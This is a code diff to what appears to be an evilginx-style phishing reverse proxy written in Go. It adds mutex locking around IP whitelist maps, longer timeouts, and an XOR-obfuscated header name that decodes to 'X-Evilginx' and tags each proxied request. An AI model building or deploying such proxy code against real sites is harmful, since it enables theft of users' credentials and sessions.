@@ -21,6 +21,7 @@ import (
 	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/elazarl/goproxy"
@@ -37,8 +38,8 @@ const (
 )
 
 const (
-	httpReadTimeout  = 15 * time.Second
-	httpWriteTimeout = 15 * time.Second
+	httpReadTimeout  = 45 * time.Second
+	httpWriteTimeout = 45 * time.Second
 
 	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
 	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
@@ -61,6 +62,7 @@ type HttpProxy struct {
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
 	auto_filter_mimes []string
+	ip_mtx            sync.Mutex
 }
 
 type ProxySession struct {
@@ -137,6 +139,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					pl_name = pl.Name
 				}
 
+				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
@@ -217,6 +220,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+        hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -245,6 +249,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
+				for n, b := range hg {
+					hg[n] = b ^ 0xCC
+				}
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -272,6 +279,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -1052,12 +1060,18 @@ func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
 	log.Debug("whitelistIP: %s %s", ip_addr, sid)
 	p.ip_whitelist[ip_addr] = time.Now().Add(15 * time.Second).Unix()
 	p.ip_sids[ip_addr] = sid
 }
 
 func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
 	log.Debug("isWhitelistIP: %s", ip_addr)
 	ct := time.Now()
 	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
@@ -1068,6 +1082,9 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
 }
 
 func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
+
 	sid, ok := p.ip_sids[ip_addr]
 	return sid, ok
 }
